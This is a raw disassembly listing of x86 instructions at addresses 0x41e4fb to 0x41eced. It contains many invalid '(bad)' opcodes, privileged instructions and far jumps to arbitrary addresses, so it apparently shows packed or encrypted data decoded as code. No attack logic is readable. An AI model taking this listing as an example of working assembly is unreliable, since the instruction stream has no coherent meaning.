  41e4fb:	adc    DWORD PTR [edx+0xad0001],esp
  41e501:	add    BYTE PTR [eax],al
  41e503:	lahf   
  41e504:	test   eax,0x1048cb89
  41e509:	stc    
  41e50a:	mov    DWORD PTR [esi-0x8d0d2da],0x5edc077d
  41e514:	cmp    bh,al
  41e516:	sub    esp,DWORD PTR [ebx+0x58025ae0]
  41e51c:	push   esi
  41e51d:	jmp    0x41e559
  41e51f:	dec    edx
  41e520:	lock xlat BYTE PTR ds:[ebx]
  41e522:	mov    ecx,0x68c90a5b
  41e527:	fisubr DWORD PTR [eax-0x1b201813]
  41e52d:	jbe    0x41e4f7
  41e52f:	add    bl,dl
  41e531:	int    0xfc
  41e533:	push   edi
  41e534:	adc    eax,DWORD PTR [eax-0x6827cf1a]
  41e53a:	sub    edi,DWORD PTR [edx-0xc]
  41e53d:	jae    0x41e56b
  41e53f:	pop    ss
  41e540:	and    dl,dl
  41e542:	xchg   edx,eax
  41e543:	bound  esp,QWORD PTR [edx-0x9]
  41e546:	adc    BYTE PTR [edi+0x7a4dd081],0x83
  41e54d:	sbb    BYTE PTR [edx+eax*1-0x46733dc1],dh
  41e554:	xchg   ebx,ebp
  41e556:	jae    0x41e518
  41e558:	xor    DWORD PTR [edx-0xb],ecx
  41e55b:	jb     0x41e524
  41e55d:	mov    ebp,edi
  41e55f:	pop    ecx
  41e560:	adc    BYTE PTR [esi+esi*2-0x2d],bh
  41e564:	sub    ah,BYTE PTR [ecx+0x7990df27]
  41e56a:	cmp    DWORD PTR [ebp-0x5c],0xaa77dc69
  41e571:	test   eax,0x19b1c520
  41e576:	xor    DWORD PTR [eax],eax
  41e578:	push   esi
  41e579:	xor    bh,BYTE PTR [edi+eiz*8-0x4e2823f4]
  41e580:	jb     0x41e597
  41e582:	xor    eax,0xb1d01273
  41e587:	inc    bl
  41e589:	aaa    
  41e58a:	lods   al,BYTE PTR ds:[esi]
  41e58b:	ins    BYTE PTR es:[edi],dx
  41e58c:	sbb    esi,DWORD PTR [esi]
  41e58e:	(bad)  
  41e58f:	repz hlt 
  41e591:	pop    es
  41e592:	stos   BYTE PTR es:[edi],al
  41e593:	inc    esi
  41e594:	mov    al,ds:0x9fa33dee
  41e599:	gs ffree st(0)
  41e59c:	jae    0x41e52a
  41e59e:	or     dl,BYTE PTR [eax+0xc15302d]
  41e5a4:	fwait
  41e5a5:	cwde   
  41e5a6:	sar    DWORD PTR [edx-0x1b697f9f],0x60
  41e5ad:	pop    eax
  41e5ae:	loopne 0x41e624
	...
  41e5b8:	add    BYTE PTR [eax],al
  41e5ba:	add    BYTE PTR [edi],ah
  41e5bc:	push   ecx
  41e5bd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41e5c7:	aam    0xce
  41e5c9:	cmc    
  41e5ca:	loope  0x41e58a
  41e5cc:	mov    ds:0xad0001,al
  41e5d1:	add    BYTE PTR [eax],al
  41e5d3:	pusha  
  41e5d4:	in     eax,0x6c
  41e5d6:	jns    0x41e569
  41e5d8:	(bad)  
  41e5d9:	mov    bl,BYTE PTR [eax+edi*1]
  41e5dc:	xchg   ebx,eax
  41e5dd:	pop    edx
  41e5de:	nop
  41e5df:	dec    ebp
  41e5e0:	mov    ds:0xd6d10e9d,al
  41e5e5:	bound  edx,QWORD PTR [ebp+0x4ad47272]
  41e5eb:	fadd   QWORD PTR [edi+0x6dc5928d]
  41e5f1:	dec    esi
  41e5f2:	repnz out 0x28,eax
  41e5f5:	out    dx,eax
  41e5f6:	mov    esi,0xe50d22e0
  41e5fb:	jnp    0x41e608
  41e5fd:	call   0xfb8e0971
  41e602:	sbb    BYTE PTR [edx],bh
  41e604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e605:	adc    BYTE PTR [ebx-0x6c],dh
  41e608:	sub    esp,DWORD PTR gs:0x608aff5a
  41e60f:	mov    ds:0xa78f9202,al
  41e614:	popf   
  41e615:	out    dx,eax
  41e616:	mov    al,0xd3
  41e618:	cmc    
  41e619:	sub    esi,DWORD PTR [ebx+0x3db6796a]
  41e61f:	cmp    bh,bh
  41e621:	dec    esi
  41e622:	(bad)  
  41e623:	in     al,dx
  41e624:	fdivp  st(6),st
  41e626:	xor    ebp,DWORD PTR [eax-0x1b9e7877]
  41e62c:	pop    eax
  41e62d:	jecxz  0x41e684
  41e62f:	mov    ch,0x84
  41e631:	mov    ?,WORD PTR [esi+eax*1]
  41e634:	push   0xaadf2975
  41e639:	(bad)  
  41e63a:	pop    esp
  41e63b:	jle    0x41e64e
  41e63d:	iret   
  41e63e:	dec    ebx
  41e63f:	leave  
  41e640:	call   0x7eb33b5b
  41e645:	pop    ebx
  41e646:	daa    
  41e647:	cmp    eax,0x58104a13
  41e64c:	repz adc eax,0x932bb507
  41e652:	mov    ah,0x6d
  41e654:	int    0xa8
  41e656:	neg    DWORD PTR [ebp-0x36]
  41e659:	inc    edx
  41e65a:	test   al,0x9
  41e65c:	sub    BYTE PTR [eax],ah
  41e65e:	out    0x5c,al
  41e660:	jmp    0x41e626
  41e662:	int3   
  41e663:	add    eax,0xd4c9e0e1
  41e668:	pop    es
  41e669:	gs mov esp,0xf0ca49cc
  41e66f:	add    esi,edi
  41e671:	adc    ebx,edx
  41e673:	add    al,0xd
  41e675:	pop    eax
  41e676:	add    al,0x4b
  41e678:	test   al,0xff
  41e67a:	xor    BYTE PTR [eax+eax*4+0x9e8666],bh
	...
  41e689:	add    BYTE PTR [eax],al
  41e68b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e68f:	jne    0x41e6f0
  41e691:	jg     0x41e6cd
  41e693:	clc    
  41e694:	cs aas 
  41e696:	push   0x9859aa0c
  41e69b:	push   0xffffff8a
  41e69d:	add    DWORD PTR [eax],eax
  41e69f:	lods   eax,DWORD PTR ds:[esi]
  41e6a0:	add    BYTE PTR [eax],al
  41e6a2:	add    BYTE PTR [eax+0x56bc7c56],dl
  41e6a8:	or     cl,BYTE PTR [edi+0x3]
  41e6ab:	adc    BYTE PTR [ebx],dh
  41e6ad:	jle    0x41e676
  41e6af:	imul   ecx,esi,0xffffff9c
  41e6b2:	js     0x41e6cb
  41e6b4:	pusha  
  41e6b5:	out    0xc6,eax
  41e6b7:	js     0x41e66c
  41e6b9:	push   edi
  41e6ba:	add    DWORD PTR [ebp+0x2396c73c],ebp
  41e6c0:	mov    WORD PTR [edx+esi*1-0x5162eb72],?
  41e6c7:	icebp  
  41e6c8:	pop    eax
  41e6c9:	arpl   di,dx
  41e6cb:	mov    esp,0xe537a1f7
  41e6d0:	pop    DWORD PTR [ebp-0x1c84082b]
  41e6d6:	mov    al,ds:0x37cb02bc
  41e6db:	sub    al,0x6f
  41e6dd:	mov    BYTE PTR [edx],bl
  41e6df:	popa   
  41e6e0:	mov    esp,0x221e9e74
  41e6e5:	mov    esp,DWORD PTR [esi-0x621122d7]
  41e6eb:	frstor [edx+0x44]
  41e6ee:	dec    esp
  41e6ef:	add    al,0x3a
  41e6f1:	adc    ebx,ecx
  41e6f3:	div    BYTE PTR [edi]
  41e6f5:	and    cl,ah
  41e6f7:	nop
  41e6f8:	dec    di
  41e6fa:	out    0x53,al
  41e6fc:	aam    0xf6
  41e6fe:	js     0x41e6b1
  41e700:	fidiv  WORD PTR [ebx+ebp*1+0x707b81f1]
  41e707:	xchg   ecx,eax
  41e708:	les    esp,FWORD PTR [ebx]
  41e70a:	(bad)  
  41e70b:	pop    ebx
  41e70c:	shr    DWORD PTR [ebp*8-0x2e1bd6d5],cl
  41e713:	sub    BYTE PTR [edi+0x1b],cl
  41e716:	or     ch,BYTE PTR [eax+0x717d7d35]
  41e71c:	inc    ebp
  41e71d:	jno    0x41e795
  41e71f:	(bad)  
  41e720:	dec    ebp
  41e721:	outs   dx,BYTE PTR ds:[esi]
  41e722:	pop    edx
  41e723:	pop    esi
  41e724:	xor    ah,ah
  41e726:	outs   dx,BYTE PTR ds:[esi]
  41e727:	add    esi,DWORD PTR [ecx-0x134d2c6f]
  41e72d:	sbb    ebp,eax
  41e72f:	dec    edx
  41e730:	jb     0x41e6ec
  41e732:	jmp    0x93bfc9eb
  41e737:	dec    eax
  41e738:	inc    edx
  41e739:	sbb    bl,0xd0
  41e73c:	add    BYTE PTR [edx],al
  41e73e:	sub    ebp,edx
  41e740:	pusha  
  41e741:	aad    0xb5
  41e743:	das    
  41e744:	push   ss
  41e745:	scas   eax,DWORD PTR es:[edi]
  41e746:	pop    edi
  41e747:	add    dl,BYTE PTR [eax-0x4a274fb7]
  41e74d:	xor    DWORD PTR [edx],ebp
  41e74f:	(bad)  
	...
  41e758:	add    BYTE PTR [eax],al
  41e75a:	add    BYTE PTR [eax],cl
  41e75c:	mov    cl,0x72
  41e75e:	cmp    edi,ebx
  41e760:	sti    
  41e761:	dec    ecx
  41e762:	mov    bl,0x94
  41e764:	je     0x41e73d
  41e766:	call   0x8b17:0xd341b1c3
  41e76d:	add    DWORD PTR [eax],eax
  41e76f:	lods   eax,DWORD PTR ds:[esi]
  41e770:	add    BYTE PTR [eax],al
  41e772:	add    ch,dl
  41e774:	sbb    eax,0xb54f112b
  41e779:	pop    eax
  41e77a:	test   DWORD PTR [ecx-0x4a],edi
  41e77d:	or     eax,0x72bc9efc
  41e782:	and    ah,ah
  41e784:	push   esp
  41e785:	push   ecx
  41e786:	mov    cl,0xbb
  41e788:	inc    ebx
  41e789:	int    0xfe
  41e78b:	and    DWORD PTR [esi+edx*1-0x8],esi
  41e78f:	in     eax,0xdf
  41e791:	jle    0x41e7bf
  41e793:	rol    DWORD PTR [ebx],0xaa
  41e796:	pop    edi
  41e797:	mov    dl,0x87
  41e799:	xor    al,cl
  41e79b:	and    DWORD PTR [ecx+0x14d4b2cd],eax
  41e7a1:	fild   WORD PTR [eax+0x1e]
  41e7a4:	fisubr WORD PTR [edx-0x69b48caa]
  41e7aa:	sub    al,0x43
  41e7ac:	sbb    eax,0xd9c921e9
  41e7b1:	and    BYTE PTR [esi-0x30224282],dh
  41e7b7:	or     cl,BYTE PTR [edx+0x7e263fb1]
  41e7bd:	push   0x2262c104
  41e7c2:	xchg   esp,eax
  41e7c3:	and    BYTE PTR [eax-0x3b4aaca4],0x41
  41e7ca:	ss jl  0x41e766
  41e7cd:	mov    edi,0xac35c66f
  41e7d2:	dec    edx
  41e7d3:	inc    edx
  41e7d4:	and    dh,BYTE PTR [edi-0x627b9e6e]
  41e7da:	pop    ss
  41e7db:	inc    ebp
  41e7dc:	mov    esp,0x3b5454b0
  41e7e1:	xchg   esp,eax
  41e7e2:	stos   DWORD PTR es:[edi],eax
  41e7e3:	pushf  
  41e7e4:	dec    esi
  41e7e5:	hlt    
  41e7e6:	test   DWORD PTR [ebx-0x52a61c71],esp
  41e7ec:	repz pop ebx
  41e7ee:	inc    ecx
  41e7ef:	mov    esp,0x7e0f8023
  41e7f4:	cwde   
  41e7f5:	lock jmp 0x41e793
  41e7f8:	mov    ds:0x146507e7,eax
  41e7fd:	push   DWORD PTR [esi+0x486921e8]
  41e803:	jle    0x41e7c5
  41e805:	push   ds
  41e806:	pop    ebp
  41e807:	jno    0x41e803
  41e809:	push   ebp
  41e80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80b:	push   ss
  41e80c:	cli    
  41e80d:	sbb    eax,0x2a7f9b3a
  41e812:	mov    ch,0xc1
  41e814:	aaa    
  41e815:	xchg   ebx,eax
  41e816:	xor    eax,0x83125995
  41e81b:	and    BYTE PTR [eax+0x17],ah
  41e81e:	pop    esi
  41e81f:	add    BYTE PTR ss:[eax],al
	...
  41e82a:	add    bh,bl
  41e82c:	push   ebx
  41e82d:	mov    dl,0x4f
  41e82f:	mov    esi,0x67d3ffef
  41e834:	xchg   ecx,edi
  41e836:	adc    al,0x98
  41e838:	mov    ?,WORD PTR [eax]
  41e83a:	and    esp,eax
  41e83c:	mov    eax,DWORD PTR [ecx]
  41e83e:	add    BYTE PTR [ebp-0x7d000000],ch
  41e844:	push   esi
  41e845:	mov    al,BYTE PTR [eax-0x2be25227]
  41e84b:	cmp    DWORD PTR [ecx],ecx
  41e84d:	addr16 nop
  41e84f:	cmp    esi,0x6f
  41e852:	repz call DWORD PTR [ebx+0x73925d70]
  41e859:	push   es
  41e85a:	es in  eax,dx
  41e85c:	bound  eax,QWORD PTR [ecx+edi*8]
  41e85f:	adc    ah,BYTE PTR [eax+ebp*2+0x36]
  41e863:	repnz iret 
  41e865:	dec    edx
  41e866:	mov    eax,0x5a4c3e18
  41e86b:	std    
  41e86c:	repnz fstp TBYTE PTR [edi]
  41e86f:	fsub   DWORD PTR [ebx]
  41e871:	sbb    eax,0xe1f801d9
  41e876:	(bad)  
  41e878:	jle    0x41e889
  41e87a:	push   cs
  41e87b:	leave  
  41e87c:	mov    edi,edi
  41e87e:	dec    esp
  41e87f:	lea    ebx,[esi+0xb]
  41e882:	clc    
  41e883:	clc    
  41e884:	(bad)  [eax+0x64]
  41e887:	nop
  41e888:	jnp    0x41e817
  41e88a:	repz rcr BYTE PTR [eax+0x3d748337],1
  41e891:	add    edi,DWORD PTR [ebx+0x2f0909c0]
  41e897:	xor    esp,esi
  41e899:	and    BYTE PTR [ecx+edi*8-0x409420ec],al
  41e8a0:	push   ds
  41e8a1:	push   esp
  41e8a2:	adc    BYTE PTR [ebp+0x4f6bc4b1],0xd9
  41e8a9:	push   edi
  41e8aa:	icebp  
  41e8ab:	clc    
  41e8ac:	sub    al,0xf2
  41e8ae:	in     al,dx
  41e8af:	rol    BYTE PTR [ebp+0x76],0xe0
  41e8b3:	jnp    0x41e86a
  41e8b5:	and    cl,dl
  41e8b7:	icebp  
  41e8b8:	jnp    0x41e8d4
  41e8ba:	and    ebp,DWORD PTR [edx+0x3c520131]
  41e8c0:	inc    edi
  41e8c1:	mov    BYTE PTR [eax+esi*1],dh
  41e8c4:	cmp    eax,0x62e9fc48
  41e8c9:	mov    al,0xf0
  41e8cb:	lds    eax,FWORD PTR [edi+0x39]
  41e8ce:	fs aad 0x76
  41e8d1:	mov    ecx,0xb1607f88
  41e8d6:	cmp    eax,esi
  41e8d8:	xor    ch,BYTE PTR [ebx+0x1d24c4f]
  41e8de:	and    al,dl
  41e8e0:	push   es
  41e8e1:	and    ecx,ebp
  41e8e3:	test   BYTE PTR ds:0x4541fc76,cl
  41e8e9:	jmp    0x6a65ba1e
  41e8ee:	cmp    edx,DWORD PTR [esi]
	...
  41e8f8:	add    BYTE PTR [eax],al
  41e8fa:	add    BYTE PTR [edi-0x24252cf4],al
  41e900:	fisttp WORD PTR [edi+0x640ccb5d]
  41e906:	push   ss
  41e907:	out    dx,eax
  41e908:	dec    ebp
  41e909:	icebp  
  41e90a:	dec    edi
  41e90b:	jno    0x41e899
  41e90d:	add    DWORD PTR [eax],eax
  41e90f:	lods   eax,DWORD PTR ds:[esi]
  41e910:	add    BYTE PTR [eax],al
  41e912:	add    BYTE PTR [edi-0x5b],bl
  41e915:	pop    ebx
  41e916:	sbb    bl,BYTE PTR [eax-0x386386c6]
  41e91c:	mov    ds:0xdfed1616,eax
  41e921:	push   cs
  41e922:	dec    edi
  41e923:	mov    ds:0x3f3382b8,al
  41e928:	sbb    BYTE PTR [edi-0x7b51190d],ah
  41e92e:	push   ss
  41e92f:	adc    al,BYTE PTR [edi+0x1]
  41e932:	adc    eax,0xe79555cc
  41e937:	xor    eax,0x854e4fda
  41e93d:	pusha  
  41e93e:	push   eax
  41e93f:	xchg   BYTE PTR [ebp+0x3e],bl
  41e942:	add    eax,0x1e05577c
  41e947:	or     eax,0x316134d3
  41e94c:	pop    ss
  41e94d:	pop    esp
  41e94e:	and    al,BYTE PTR [edi-0x4e]
  41e951:	outs   dx,BYTE PTR ds:[esi]
  41e952:	push   esp
  41e953:	push   ecx
  41e954:	or     BYTE PTR [esi],ch
  41e956:	add    DWORD PTR [ebx+0x6211991c],edx
  41e95c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e95d:	out    dx,eax
  41e95e:	mov    edi,cs
  41e960:	test   al,0x1c
  41e962:	int    0x40
  41e964:	loope  0x41e963
  41e966:	ret    0xb3e0
  41e969:	icebp  
  41e96a:	jmp    0x7362:0xda2d2ff6
  41e971:	pop    ecx
  41e972:	call   FWORD PTR [ecx+0x6bdc4fa4]
  41e978:	call   0xc14c:0x8012847c
  41e97f:	jnp    0x41e9ad
  41e981:	push   ss
  41e982:	sub    ecx,esp
  41e984:	sar    BYTE PTR es:[edi-0x700e6b59],0x14
  41e98c:	(bad)  
  41e98d:	(bad)  [edx]
  41e98f:	out    dx,al
  41e990:	adc    eax,0x11f295b9
  41e995:	(bad)  
  41e996:	aaa    
  41e997:	mov    edx,0x7c405521
  41e99c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e99d:	dec    ebp
  41e99e:	mov    BYTE PTR ds:0xd7cd9d32,ch
  41e9a4:	mov    ch,0x84
  41e9a6:	or     al,0xad
  41e9a8:	push   0xffffffaa
  41e9aa:	mov    dh,0x96
  41e9ac:	jp     0x41e97e
  41e9ae:	(bad)  
  41e9af:	call   DWORD PTR [ebx]
  41e9b1:	add    esp,DWORD PTR [edx+0x2a]
  41e9b4:	cmp    edi,0xffffff90
  41e9b7:	add    BYTE PTR [ecx-0x44],al
  41e9ba:	(bad)  
  41e9bb:	xor    al,BYTE PTR [ecx+0x2dfcb4]
	...
  41e9c9:	add    BYTE PTR [eax],al
  41e9cb:	lahf   
  41e9cc:	arpl   WORD PTR [ebp+0x72],cx
  41e9cf:	std    
  41e9d0:	jle    0x41e991
  41e9d2:	out    dx,eax
  41e9d3:	sbb    edi,esp
  41e9d5:	mov    BYTE PTR [esp+ebp*2+0x1e410017],dh
  41e9dc:	lea    eax,[ecx]
  41e9de:	add    BYTE PTR [ebp-0x23000000],ch
  41e9e4:	(bad)  
  41e9e5:	jne    0x41e999
  41e9e7:	test   DWORD PTR [edi+0xdcd1e8d],edi
  41e9ed:	ss sub eax,0x490054b2
  41e9f3:	(bad)  
  41e9f4:	cs jmp 0x41ea3b
  41e9f7:	loop   0x41e9d6
  41e9f9:	popa   
  41e9fa:	pop    es
  41e9fb:	cli    
  41e9fc:	or     DWORD PTR [ebx+eiz*1+0xd],ebp
  41ea00:	xchg   BYTE PTR [ebx+0x5da71b09],bh
  41ea06:	jg     0x41ea08
  41ea08:	loop   0x41ea25
  41ea0a:	push   cs
  41ea0b:	(bad)  
  41ea0c:	ror    dh,0x12
  41ea0f:	xchg   edx,eax
  41ea10:	gs in  al,dx
  41ea12:	inc    esp
  41ea13:	xor    al,0x5d
  41ea15:	cmp    BYTE PTR [edi],ch
  41ea17:	jecxz  0x41e9bc
  41ea19:	les    esp,FWORD PTR [edx-0x35]
  41ea1c:	stos   DWORD PTR es:[edi],eax
  41ea1d:	repz add edx,DWORD PTR [ebx+0x15c7bc3b]
  41ea24:	xchg   esi,eax
  41ea25:	xlat   BYTE PTR ds:[ebx]
  41ea26:	adc    BYTE PTR [ebp-0x2184e14d],al
  41ea2c:	xor    dh,BYTE PTR [edx+esi*4-0x7f2fe3a1]
  41ea33:	mov    cl,0x4e
  41ea35:	scas   al,BYTE PTR es:[edi]
  41ea36:	or     ax,0xf737
  41ea3a:	jmp    DWORD PTR [esi-0x80]
  41ea3d:	xor    DWORD PTR [ebp-0x7f0046e1],eax
  41ea43:	jle    0x41e9fd
  41ea45:	loope  0x41eaa7
  41ea47:	test   eax,0xc19b83a0
  41ea4c:	mov    ah,0x72
  41ea4e:	cmp    DWORD PTR [edi],esi
  41ea50:	fdivr  DWORD PTR ds:[eax-0x60]
  41ea54:	test   al,0x29
  41ea56:	push   0x23
  41ea58:	mov    ecx,0x83e7bdc
  41ea5d:	popa   
  41ea5e:	add    ebp,esp
  41ea60:	mov    eax,0x9ca90a6
  41ea65:	dec    eax
  41ea66:	(bad)  
  41ea67:	jmp    0x7ea4de05
  41ea6c:	mov    WORD PTR [edi],fs
  41ea6e:	inc    esp
  41ea6f:	jo     0x41ea9e
  41ea71:	adc    ah,BYTE PTR [ebp-0x3c56d246]
  41ea77:	sti    
  41ea78:	pop    ss
  41ea79:	call   0x872f:0x4105281e
  41ea80:	jmp    0xf9c2:0x71444101
  41ea87:	fsub   st,st(7)
  41ea89:	(bad)  
  41ea8a:	addr16 push esi
  41ea8c:	sub    dl,BYTE PTR [esi-0x53]
  41ea8f:	pop    ds
	...
  41ea98:	add    BYTE PTR [eax],al
  41ea9a:	add    BYTE PTR [eax+0x23],dh
  41ea9d:	and    eax,0x7c6f7769
  41eaa2:	cmp    esp,DWORD PTR [eax+0x5fbcee1c]
  41eaa8:	das    
  41eaa9:	outs   dx,BYTE PTR ds:[esi]
  41eaaa:	cmp    bl,cl
  41eaac:	lea    eax,[ecx]
  41eaae:	add    BYTE PTR [ebp+0x51000000],ch
  41eab4:	add    al,0xe8
  41eab6:	loop   0x41eaeb
  41eab8:	gs jge 0x41eb37
  41eabb:	fmul   st,st(1)
  41eabd:	inc    eax
  41eabe:	cld    
  41eabf:	div    BYTE PTR [eax-0x53ea20b7]
  41eac5:	daa    
  41eac6:	ds popf 
  41eac8:	data16 cmc 
  41eaca:	jns    0x41eb28
  41eacc:	neg    DWORD PTR [esi]
  41eace:	hlt    
  41eacf:	mov    ecx,0x1f30f14d
  41ead4:	loope  0x41ea82
  41ead6:	xor    cl,BYTE PTR [ebx-0x56b77293]
  41eadc:	nop
  41eadd:	push   0xd5040553
  41eae2:	mov    eax,ds:0x1d67ba6c
  41eae7:	pop    ecx
  41eae8:	gs out dx,eax
  41eaea:	ret    0xe364
  41eaed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaee:	repnz stos DWORD PTR es:[edi],eax
  41eaf0:	call   0xe8df905e
  41eaf5:	outs   dx,BYTE PTR ds:[esi]
  41eaf6:	icebp  
  41eaf7:	xor    BYTE PTR [esi-0x63],dh
  41eafa:	xor    edi,esi
  41eafc:	xchg   edi,eax
  41eafd:	(bad)  
  41eafe:	aad    0xa6
  41eb00:	in     eax,dx
  41eb01:	retf   
  41eb02:	xchg   ecx,eax
  41eb03:	lahf   
  41eb04:	(bad)  
  41eb05:	push   eax
  41eb06:	out    dx,eax
  41eb07:	nop
  41eb08:	mov    al,ds:0xbba3793f
  41eb0d:	cmp    BYTE PTR [edx-0x24],ch
  41eb10:	ss dec ebx
  41eb12:	dec    esi
  41eb13:	mov    ds:0x337af8f8,al
  41eb18:	rol    DWORD PTR [eax-0x19c13ee3],cl
  41eb1e:	jmp    0x936c34ba
  41eb23:	sub    ebp,DWORD PTR [ecx-0x71]
  41eb26:	in     al,dx
  41eb27:	adc    DWORD PTR [eax],0xd059dbe
  41eb2d:	icebp  
  41eb2e:	test   DWORD PTR es:[ecx+0x67d49f23],0x747a8b36
  41eb39:	cmp    DWORD PTR ds:0x50ecfdcd,esi
  41eb3f:	and    DWORD PTR [edx+0x789bbc26],ebp
  41eb45:	popa   
  41eb46:	adc    al,0xad
  41eb48:	fisub  DWORD PTR [edi-0x30052c67]
  41eb4e:	outs   dx,BYTE PTR ds:[esi]
  41eb4f:	retf   0x87dc
  41eb52:	in     al,0x30
  41eb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb55:	shl    DWORD PTR [edi],cl
  41eb57:	xor    DWORD PTR [ebx-0x5be1c17b],edi
  41eb5d:	lea    edx,ds:0xbc
	...
  41eb6b:	xchg   esp,eax
  41eb6c:	nop
  41eb6d:	ffree  st(0)
  41eb6f:	(bad)  
  41eb71:	popf   
  41eb72:	aam    0x57
  41eb74:	(bad)
  41eb78:	ds pop ecx
  41eb7a:	cdq    
  41eb7b:	js     0x41eb0b
  41eb7d:	add    DWORD PTR [eax],eax
  41eb7f:	lods   eax,DWORD PTR ds:[esi]
  41eb80:	add    BYTE PTR [eax],al
  41eb82:	add    BYTE PTR [eax],bh
  41eb84:	les    edx,FWORD PTR [ebp+0x7e72f719]
  41eb8a:	(bad)  
  41eb8b:	xor    eax,DWORD PTR [esi]
  41eb8d:	icebp  
  41eb8e:	mov    WORD PTR ds:0x272c83d8,ds
  41eb94:	pusha  
  41eb95:	or     bh,ch
  41eb97:	cmp    al,0xaf
  41eb99:	mov    ah,0xf5
  41eb9b:	lea    edi,[edi]
  41eb9d:	ins    DWORD PTR es:[edi],dx
  41eb9e:	je     0x41eb64
  41eba0:	pop    edx
  41eba1:	mov    edx,0xc96ef754
  41eba6:	sbb    al,BYTE PTR [ecx]
  41eba8:	call   0x8641:0x7a6d6390
  41ebaf:	mov    eax,ds:0x82e520dc
  41ebb4:	xchg   esp,eax
  41ebb5:	xchg   edx,eax
  41ebb6:	pop    esi
  41ebb7:	ret    
  41ebb8:	mov    ?,WORD PTR [edx]
  41ebba:	pop    edi
  41ebbb:	sar    cl,1
  41ebbd:	test   eax,0xdf5ca6e6
  41ebc2:	or     dh,bl
  41ebc4:	pushf  
  41ebc5:	cmp    eax,0x98a8e5bf
  41ebca:	cmc    
  41ebcb:	and    eax,esi
  41ebcd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ebcf:	retf   0x3cd
  41ebd2:	inc    esi
  41ebd3:	mov    ds:0xc343c45f,al
  41ebd8:	mov    ecx,0x96a27de
  41ebdd:	push   0x53
  41ebdf:	jae    0x41ebaf
  41ebe1:	std    
  41ebe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebe3:	(bad)  
  41ebe4:	es cdq 
  41ebe6:	clc    
  41ebe7:	fisttp DWORD PTR [edi+0x793a2b25]
  41ebed:	dec    edx
  41ebee:	fwait
  41ebef:	xor    al,0xa9
  41ebf1:	mov    bh,0xc2
  41ebf3:	sub    BYTE PTR [esi-0x9f6a9da],bl
  41ebf9:	dec    eax
  41ebfa:	pop    eax
  41ebfb:	mov    cs,eax
  41ebfd:	or     esp,0xd7c5269a
  41ec03:	das    
  41ec04:	fst    QWORD PTR [ebp+0x290917eb]
  41ec0a:	retf   
  41ec0b:	out    0x3,al
  41ec0d:	jle    0x41ec43
  41ec0f:	or     eax,0xffffffa6
  41ec12:	sbb    BYTE PTR gs:[ebx+0x0],cl
  41ec16:	push   cs
  41ec17:	add    edx,DWORD PTR [esi+0x39]
  41ec1a:	mov    ah,0x37
  41ec1c:	(bad)  [ecx]
  41ec1e:	lahf   
  41ec1f:	int3   
  41ec20:	int    0x64
  41ec22:	and    BYTE PTR [edx+0x10],al
  41ec25:	dec    esp
  41ec26:	xchg   DWORD PTR [esi],edx
  41ec28:	push   0x5c
  41ec2a:	mov    ebp,0x386f4715
  41ec2f:	xchg   DWORD PTR [eax],eax
	...
  41ec39:	add    BYTE PTR [eax],al
  41ec3b:	hlt    
  41ec3c:	mov    dl,0x32
  41ec3e:	(bad)  
  41ec3f:	jbe    0x41ec17
  41ec41:	hlt    
  41ec42:	mov    dl,0xb1
  41ec44:	and    al,0xfe
  41ec46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec47:	pop    esp
  41ec48:	inc    ebp
  41ec49:	ret    0x25aa
  41ec4c:	pop    DWORD PTR [ecx]
  41ec4e:	add    BYTE PTR [ebp-0x2c000000],ch
  41ec54:	shr    edx,0xdf
  41ec57:	scas   al,BYTE PTR es:[edi]
  41ec58:	retf   
  41ec59:	call   0xe7f3:0x2a120461
  41ec60:	mov    ds,WORD PTR [eax]
  41ec62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec63:	or     ecx,edi
  41ec65:	add    al,0xa2
  41ec67:	dec    esi
  41ec68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec69:	cli    
  41ec6a:	jl     0x41eca8
  41ec6c:	cmc    
  41ec6d:	mov    esp,0xc505f94a
  41ec72:	xor    al,0x1c
  41ec74:	ds push edx
  41ec76:	sbb    esi,DWORD PTR [edi-0x47]
  41ec79:	xor    eax,DWORD PTR [ebx+0x60052289]
  41ec7f:	push   edx
  41ec80:	(bad)  
  41ec83:	dec    ecx
  41ec84:	push   edx
  41ec85:	push   0x1b1570e0
  41ec8a:	popa   
  41ec8b:	rol    BYTE PTR [edx+0x5e7cf254],cl
  41ec91:	fld    DWORD PTR [ebx-0x2dbd3f49]
  41ec97:	icebp  
  41ec98:	and    BYTE PTR [edi],bh
  41ec9a:	aad    0x29
  41ec9c:	int3   
  41ec9d:	icebp  
  41ec9e:	mov    cl,0xb1
  41eca0:	inc    edi
  41eca1:	stc    
  41eca2:	lds    edx,FWORD PTR [ebx+0x24]
  41eca5:	inc    esi
  41eca6:	inc    esi
  41eca7:	xor    al,0x14
  41eca9:	or     edx,DWORD PTR [eax+0x5cac6b7]
  41ecaf:	and    DWORD PTR [edx+0x7f1d2fd5],eax
  41ecb5:	jnp    0x41ecdd
  41ecb7:	cmc    
  41ecb8:	mov    esp,0x4ae8201c
  41ecbd:	ret    0xd94e
  41ecc0:	cmp    al,0xa1
  41ecc2:	push   edx
  41ecc3:	sub    ebx,DWORD PTR [ebx+0x34]
  41ecc6:	mov    ch,0x7c
  41ecc8:	fst    QWORD PTR [ebp+0x14]
  41eccb:	out    0x8f,eax
  41eccd:	ret    0xb12e
  41ecd0:	adc    bh,BYTE PTR [edi-0x3b46465b]
  41ecd6:	xlat   BYTE PTR ds:[ebx]
  41ecd7:	out    0xcb,al
  41ecd9:	fldcw  WORD PTR [eax-0x7aba3906]
  41ecdf:	mov    WORD PTR [edi-0x54],cs
  41ece2:	mov    dh,0xda
  41ece4:	(bad)  
  41ece5:	push   esi
  41ece6:	adc    eax,DWORD PTR [ecx+eiz*8]
  41ece9:	popa   
  41ecea:	std    
  41eceb:	cmp    bl,ah
  41eced:	cmp    esi,DWORD PTR [ecx-0x38]
